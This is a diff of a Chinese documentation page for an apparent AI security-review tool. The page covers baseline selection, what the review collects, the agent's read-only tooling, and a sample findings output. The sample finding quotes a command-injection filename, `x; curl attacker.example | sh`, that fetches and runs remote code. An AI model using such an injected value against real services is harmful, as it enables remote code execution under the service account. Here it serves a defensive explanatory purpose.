@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh" data-base="/docs/" data-page-lang="zh" data-build="1789756792" data-alt-lang-url="/docs/capabilities/security-review.html">
+<html lang="zh" data-base="/docs/" data-page-lang="zh" data-build="1789757277" data-alt-lang-url="/docs/capabilities/security-review.html">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -152,7 +152,7 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <li>没有 upstream 时，与默认分支（<code>origin/HEAD</code>、<code>origin/main</code>、<code>origin/master</code>，再到它们的本地同名分支）的 merge base，覆盖还没推送的分支。</li>
 </ol>
 <p>两者都没有时抛 <code>NoBaselineError</code>，说明缺的是什么。它不会退回 <code>HEAD~1</code> 或根提交：猜出来的范围审的是别的改动，而且不会告诉你猜过。要指定范围就自己传：</p>
-<pre><code class="language-python"><span class="n">run_security_review</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="s2">&quot;v2.1.0&quot;</span><span class="p">)</span>
+<pre><code class="language-python"><span class="n">run_security_review</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="s2">"v2.1.0"</span><span class="p">)</span>
 </code></pre>
 <h2 id="收集哪些内容">收集哪些内容<a class="header-anchor" href="#收集哪些内容">#</a></h2>
 <p>一次针对工作区的 diff，提交、暂存、未暂存的改动落在同一次审查里，先提交还是不提交拿到的结论一样。未跟踪文件单独 diff 进来，因为硬编码密钥最常出现在新文件里，而普通 diff 看不到它。被 ignore 的文件排除在外，构建产物和 vendor 目录不会进入审查，正在组织的 index 也不会被改动。</p>
@@ -205,13 +205,13 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <h2 id="结构上就是只读的">结构上就是只读的<a class="header-anchor" href="#结构上就是只读的">#</a></h2>
 <p>审查 agent 拿到 <code>read</code>、<code>grep</code>、<code>glob</code>、<code>list</code>、<code>bash</code>，没有 <code>write</code>、<code>edit</code>、<code>apply_patch</code>，也不能再派 agent。能写的审查者会去&quot;顺手修&quot;它以为发现的问题，而产出安全结论的过程改变了被审对象，这个结论就没有价值。修复以建议的形式返回，由你来落地。</p>
 <h2 id="返回什么">返回什么<a class="header-anchor" href="#返回什么">#</a></h2>
-<pre><code class="language-python"><span class="p">{</span><span class="s2">&quot;base&quot;</span><span class="p">:</span> <span class="s2">&quot;a1b2c3d…&quot;</span><span class="p">,</span> <span class="s2">&quot;files_reviewed&quot;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="s2">&quot;findings&quot;</span><span class="p">:</span> <span class="p">[</span>
-    <span class="p">{</span><span class="s2">&quot;severity&quot;</span><span class="p">:</span> <span class="s2">&quot;critical&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;file&quot;</span><span class="p">:</span> <span class="s2">&quot;api/users.py&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;line&quot;</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span>
-     <span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;导出文件名导致命令注入&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;scenario&quot;</span><span class="p">:</span> <span class="s2">&quot;已认证调用方把 filename 设为 `x; curl attacker.example | sh`，该值进入 shell=True 的 subprocess，以服务账号身份执行。&quot;</span><span class="p">,</span>
-     <span class="s2">&quot;recommendation&quot;</span><span class="p">:</span> <span class="s2">&quot;以参数列表调用 subprocess 且不用 shell=True，并拒绝 [A-Za-z0-9._-] 之外的文件名。&quot;</span><span class="p">},</span>
+<pre><code class="language-python"><span class="p">{</span><span class="s2">"base"</span><span class="p">:</span> <span class="s2">"a1b2c3d…"</span><span class="p">,</span> <span class="s2">"files_reviewed"</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="s2">"findings"</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">{</span><span class="s2">"severity"</span><span class="p">:</span> <span class="s2">"critical"</span><span class="p">,</span>
+     <span class="s2">"file"</span><span class="p">:</span> <span class="s2">"api/users.py"</span><span class="p">,</span>
+     <span class="s2">"line"</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span>
+     <span class="s2">"title"</span><span class="p">:</span> <span class="s2">"导出文件名导致命令注入"</span><span class="p">,</span>
+     <span class="s2">"scenario"</span><span class="p">:</span> <span class="s2">"已认证调用方把 filename 设为 `x; curl attacker.example | sh`，该值进入 shell=True 的 subprocess，以服务账号身份执行。"</span><span class="p">,</span>
+     <span class="s2">"recommendation"</span><span class="p">:</span> <span class="s2">"以参数列表调用 subprocess 且不用 shell=True，并拒绝 [A-Za-z0-9._-] 之外的文件名。"</span><span class="p">},</span>
 <span class="p">]}</span>
 </code></pre>
 <p>发现按 <code>critical</code> 在前排序。严重性看后果：</p>
